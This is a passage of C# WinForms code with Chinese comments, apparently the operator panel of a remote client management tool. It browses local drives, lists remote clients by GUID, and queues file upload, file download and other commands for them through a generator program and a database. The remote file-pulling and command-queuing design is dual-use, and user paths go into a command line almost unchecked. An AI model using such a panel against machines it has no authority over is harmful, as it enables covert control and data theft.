            //显示MyDocuments(我的文档)结点  
            var myDocuments = Environment.GetFolderPath             //获取计算机我的文档文件夹  
                (Environment.SpecialFolder.MyDocuments);
            TreeNode DocNode = new TreeNode(myDocuments);
            DocNode.Tag = "我的文档";                               //设置结点名称  
            DocNode.Text = "我的文档";
            DocNode.ImageIndex = IconIndexes.MyDocuments;           //设置获取结点显示图片  
            DocNode.SelectedImageIndex = IconIndexes.MyDocuments;   //设置选择显示图片  
            rootNode.Nodes.Add(DocNode);                            //rootNode目录下加载节点  
            DocNode.Nodes.Add("");

            //循环遍历计算机所有逻辑驱动器名称(盘符)  
            foreach (string drive in Environment.GetLogicalDrives())
            {
                //实例化DriveInfo对象 命名空间System.IO  
                var dir = new DriveInfo(drive);
                switch (dir.DriveType)           //判断驱动器类型  
                {
                    case DriveType.Fixed:        //仅取固定磁盘盘符 Removable-U盘   
                        {
                            //Split仅获取盘符字母  
                            TreeNode tNode = new TreeNode(dir.Name.Split(':')[0]);
                            tNode.Name = dir.Name;
                            tNode.Tag = tNode.Name;
                            tNode.ImageIndex = IconIndexes.FixedDrive;         //获取结点显示图片  
                            tNode.SelectedImageIndex = IconIndexes.FixedDrive; //选择显示图片  
                            directoryTree.Nodes.Add(tNode);                    //加载驱动节点  
                            tNode.Nodes.Add("");
                        }
                        break;
                }
            }
            rootNode.Expand();                  //展开树状视图  


            filesList.Clear();                                          //清除所有项和列
            filesList.GridLines = true;                                 // 显示行分割线
            filesList.FullRowSelect = true;                             // 必须整行选取
            filesList.View = View.Details;                              // 显示详细信息
            filesList.Scrollable = true;                                // 允许使用滚动条
            filesList.MultiSelect = false;                              // 禁止多行选择
            filesList.HeaderStyle = ColumnHeaderStyle.Nonclickable;     // 表头行不响应点击
            filesList.Columns.Add("文件名");
            filesList.Columns.Add("路径");
            filesList.Columns[0].Width = 200;
            filesList.Columns[1].Width = 300;
        }
        private void directoryTree_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            MyTreeViewItems.Add(e.Node, filesList);
        }
        private void directoryTree_AfterExpand(object sender, TreeViewEventArgs e)
        {
            e.Node.Expand();
        }
        private void filesList_DoubleClick(object sender, EventArgs e)
        {
        }
        private void filesList_Click(object sender, EventArgs e)
        {
            int i = filesList.SelectedIndices[0];
            string str = filesList.Items[i].SubItems[1].Text;
            LocalFileTextBox.Text = str;
        }
        private void ChooseLocalFileButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog dlg = new OpenFileDialog();
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                LocalFileTextBox.Text = dlg.FileName;
            }
        }
        private void ClientListView_Click(object sender, EventArgs e)
        {
            int i = ClientListView.SelectedIndices[0];
            string str = ClientListView.Items[i].Text;
            RomateUpdownGuidCB.Text = str;
        }
        private void UploadToClientBtn_Click(object sender, EventArgs e)
        {
            string strLocalPath = LocalFileTextBox.Text;
            string strRomatePath = RomateFileTextBox.Text;
            string guid = RomateUpdownGuidCB.Text;
            if (string.IsNullOrEmpty(guid))
            {
                AppendTextToTextbox("请先指定远程客户端...", CONFIG.ERROR_COLOR);
                return;
            }
            bool bFound = false;
            for (int i = 0; i < m_ClientMgr.ClientsList.Count; ++i)
            {
                if (m_ClientMgr.ClientsList[i].clientGuid.Equals(guid))
                {
                    bFound = true;
                }
            }
            if (!bFound)
            {
                AppendTextToTextbox("不存在的远程客户端ID...", CONFIG.ERROR_COLOR);
                return;
            }
            if (!File.Exists(strLocalPath))
            {
                AppendTextToTextbox("本地文件 " + strLocalPath + " 不存在，文件无法上传...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (string.IsNullOrEmpty(strRomatePath))
            {
                AppendTextToTextbox("请先指定保存时远程文件路径...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (string.IsNullOrEmpty(Path.GetFileName(strRomatePath)))
            {
                AppendTextToTextbox("请指定保存时的远程文件名 (不要路径)...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (!File.Exists(CONFIG.GENERATOR_EXE_FILE))
            {
                MessageBox.Show("请确定命令生成工具 " + CONFIG.GENERATOR_EXE_FILE + " 在当前文件夹下");
                return;
            }
            m_ReadyToSendCmd = "trans " + guid + " 1 s_to_c \"" + strLocalPath + "\" \"" + strRomatePath + "\"";
            AppendTextToTextbox("生成：" + m_ReadyToSendCmd);
            string DBStr = Execute(CONFIG.GENERATOR_EXE_FILE, m_ReadyToSendCmd, CONFIG.DEFAULT_MAX_WAITTIME);
            AppendTextToTextbox("收到：" + DBStr);

            InsertCommandToDB(DBStr);
        }
        private void DownloadToLocalBtn_Click(object sender, EventArgs e)
        {
            string strLocalPath = LocalFileTextBox.Text;
            string strRomatePath = RomateFileTextBox.Text;
            string guid = RomateUpdownGuidCB.Text;
            if (string.IsNullOrEmpty(guid))
            {
                AppendTextToTextbox("请先指定远程客户端...", CONFIG.ERROR_COLOR);
                return;
            }
            bool bFound = false;
            for (int i = 0; i < m_ClientMgr.ClientsList.Count; ++i)
            {
                if (m_ClientMgr.ClientsList[i].clientGuid.Equals(guid))
                {
                    bFound = true;
                }
            }
            if (!bFound)
            {
                AppendTextToTextbox("不存在的远程客户端ID...", CONFIG.ERROR_COLOR);
                return;
            }
            if (string.IsNullOrEmpty(strLocalPath))
            {
                AppendTextToTextbox("请先指定保存时本地文件路径...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (File.Exists(strLocalPath))
            {
                AppendTextToTextbox("本地文件 " + strLocalPath + " 已存在，请重新指定文件...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (string.IsNullOrEmpty(Path.GetFileName(strLocalPath)))
            {
                AppendTextToTextbox("请指定保存时的本地文件名 (不要路径)...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (string.IsNullOrEmpty(strRomatePath))
            {
                AppendTextToTextbox("请指定需要下载的远程文件名...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (string.IsNullOrEmpty(Path.GetFileName(strRomatePath)))
            {
                AppendTextToTextbox("请指定需要下载的远程文件名 (不要路径)...",
                    CONFIG.ERROR_COLOR);
                return;
            }
            if (!File.Exists(CONFIG.GENERATOR_EXE_FILE))
            {
                MessageBox.Show("请确定命令生成工具 " + CONFIG.GENERATOR_EXE_FILE + " 在当前文件夹下");
                return;
            }
            m_ReadyToSendCmd = "trans " + guid + " 1 c_to_s \"" + strLocalPath + "\" \"" + strRomatePath + "\"";
            AppendTextToTextbox("生成：" + m_ReadyToSendCmd);
            string DBStr = Execute(CONFIG.GENERATOR_EXE_FILE, m_ReadyToSendCmd, CONFIG.DEFAULT_MAX_WAITTIME);
            AppendTextToTextbox("收到：" + DBStr);

            InsertCommandToDB(DBStr);
        }
        #endregion

        #region 其他UI相关
        private void MainForm_SizeChanged(object sender, EventArgs e)
        {
            AttrPanel.Refresh();
        }
        private void SendCommandBtn_Click(object sender, EventArgs e)
        {
            UpdateCommandStringFormControl(true);
            if (!File.Exists(CONFIG.GENERATOR_EXE_FILE))
            {
                MessageBox.Show("请确定命令生成工具 " + CONFIG.GENERATOR_EXE_FILE + " 在当前文件夹下");
                return;
            }
            if (string.IsNullOrEmpty(m_ReadyToSendCmd))
            {
                MessageBox.Show("请确定当前命令有效.");
                return;
            }
            
            string DBStr = Execute(CONFIG.GENERATOR_EXE_FILE, m_ReadyToSendCmd, CONFIG.DEFAULT_MAX_WAITTIME);

            AppendTextToTextbox("收到：" + DBStr);

            InsertCommandToDB(DBStr);
        }
        private void UpdateClientsInfoTimer_Tick(object sender, EventArgs e)
        {
            UpdateClientListView();
        }

        private void UpdateCommandTimer_Tick(object sender, EventArgs e)
        {
            if (LoadCommands())
            {
                UpdateCommandStaticListView();
            } 
            //AppendTextToTextbox("更新command列表");
        }
        #endregion
    }
} 
